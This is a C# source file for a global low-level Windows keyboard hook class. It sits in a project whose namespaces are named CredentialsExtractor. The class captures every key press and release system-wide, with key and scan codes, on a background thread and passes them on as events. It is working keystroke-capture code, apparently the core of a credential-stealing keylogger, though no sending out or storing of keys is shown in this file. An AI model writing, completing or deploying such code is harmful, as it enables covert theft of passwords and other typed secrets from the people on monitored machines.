// KeyboardHook.cs
using System.Runtime.InteropServices;
using CredentialsExtractor.Logging;
using CredentialsExtractor.Native;

namespace CredentialsExtractor.Input
{
    public class KeyboardHook : IKeyboardHook
    {
        // Delegate for the keyboard hook callback
        private readonly NativeMethods.LowLevelKeyboardProc _proc;
        private IntPtr _hookId = IntPtr.Zero;
        private bool _isDisposed = false;
        private Thread _messageLoopThread;
        private bool _continueMessageLoop = false;
        private readonly ManualResetEventSlim _hookReadyEvent = new ManualResetEventSlim(false);
        private readonly ManualResetEventSlim _hookStoppedEvent = new ManualResetEventSlim(true);
        private readonly ILogger _logger;

        // Event to notify of key presses
        public event EventHandler<KeyPressEventArgs> KeyPressed;

        public KeyboardHook(ILogger logger)
        {
            _logger = logger;
            _proc = HookCallback;
        }

        public bool Initialize(int timeoutMs = 2000)
        {
            if (_hookId != IntPtr.Zero) return true; // Already initialized

            _hookReadyEvent.Reset();
            _hookStoppedEvent.Reset();

            try
            {
                // Start message loop in a separate thread
                _continueMessageLoop = true;
                _messageLoopThread = new Thread(MessageLoop);
                _messageLoopThread.IsBackground = true;
                _messageLoopThread.Start();

                // Wait for the hook to be ready
                bool initialized = _hookReadyEvent.Wait(timeoutMs);
                if (!initialized)
                {
                    _logger.Log("Keyboard hook initialization timed out");
                    Stop();
                }

                return initialized;
            }
            catch (Exception ex)
            {
                _logger.Log($"Keyboard hook initialization error: {ex.Message}");
                return false;
            }
        }

        private void MessageLoop()
        {
            try
            {
                using (var process = System.Diagnostics.Process.GetCurrentProcess())
                using (var module = process.MainModule)
                {
                    // Set the Windows hook
                    _hookId = NativeMethods.SetWindowsHookEx(
                        NativeMethods.WH_KEYBOARD_LL,
                        _proc,
                        NativeMethods.GetModuleHandle(module.ModuleName),
                        0);

                    if (_hookId == IntPtr.Zero)
                    {
                        int errorCode = Marshal.GetLastWin32Error();
                        _logger.Log($"Failed to set keyboard hook. Error code: {errorCode}");
                        return;
                    }

                    _logger.Log("Keyboard hook successfully initialized");
                    _hookReadyEvent.Set();

                    // Run the message loop
                    NativeMethods.MSG msg;
                    while (_continueMessageLoop)
                    {
                        if (NativeMethods.GetMessage(out msg, IntPtr.Zero, 0, 0))
                        {
                            NativeMethods.TranslateMessage(ref msg);
                            NativeMethods.DispatchMessage(ref msg);
                        }

                        // Allow for cooperative shutdown
                        Thread.Sleep(10);
                    }

                    // Clean up the hook
                    if (_hookId != IntPtr.Zero)
                    {
                        NativeMethods.UnhookWindowsHookEx(_hookId);
                        _hookId = IntPtr.Zero;
                        _logger.Log("Keyboard hook removed");
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.Log($"Error in keyboard hook message loop: {ex.Message}");
            }
            finally
            {
                _hookStoppedEvent.Set();
            }
        }

        public void Stop()
        {
            if (_messageLoopThread != null && _messageLoopThread.IsAlive)
            {
                _continueMessageLoop = false;

                // Wait for the message loop to exit
                if (!_hookStoppedEvent.Wait(1000))
                {
                    _logger.Log("Keyboard hook stop timed out");
                }

                // Clean up the hook if it's still active
                if (_hookId != IntPtr.Zero)
                {
                    NativeMethods.UnhookWindowsHookEx(_hookId);
                    _hookId = IntPtr.Zero;
                }
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                NativeMethods.KBDLLHOOKSTRUCT hookStruct =
                    (NativeMethods.KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(NativeMethods.KBDLLHOOKSTRUCT));

                // Key down events
                if (wParam == (IntPtr)NativeMethods.WM_KEYDOWN || wParam == (IntPtr)NativeMethods.WM_SYSKEYDOWN)
                {
                    var args = new KeyPressEventArgs
                    {
                        VirtualKeyCode = (int)hookStruct.vkCode,
                        ScanCode = (int)hookStruct.scanCode,
                        Flags = (int)hookStruct.flags,
                        Time = hookStruct.time,
                        IsKeyDown = true
                    };

                    KeyPressed?.Invoke(this, args);
                }
                // Key up events
                else if (wParam == (IntPtr)NativeMethods.WM_KEYUP || wParam == (IntPtr)NativeMethods.WM_SYSKEYUP)
                {
                    var args = new KeyPressEventArgs
                    {
                        VirtualKeyCode = (int)hookStruct.vkCode,
                        ScanCode = (int)hookStruct.scanCode,
                        Flags = (int)hookStruct.flags,
                        Time = hookStruct.time,
                        IsKeyDown = false
                    };

                    KeyPressed?.Invoke(this, args);
                }
            }

            return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_isDisposed)
            {
                if (disposing)
                {
                    Stop();
                    _hookReadyEvent.Dispose();
                    _hookStoppedEvent.Dispose();
                }

                _isDisposed = true;
            }
        }

        ~KeyboardHook()
        {
            Dispose(false);
        }
    }

    public class KeyboardHookFactory : IKeyboardHookFactory
    {
        public IKeyboardHook CreateKeyboardHook()
        {
            // In a real DI container, we would resolve ILogger here
            // For simplicity, we'll create a dummy logger
            ILogger logger = new FileLogger(System.IO.Path.Combine(System.IO.Path.GetTempPath(), "keyboard_hook.log"));
            return new KeyboardHook(logger);
        }
    }

    public class KeyPressEventArgs : EventArgs
    {
        public int VirtualKeyCode { get; set; }
        public int ScanCode { get; set; }
        public int Flags { get; set; }
        public uint Time { get; set; }
        public bool IsKeyDown { get; set; }
    }
}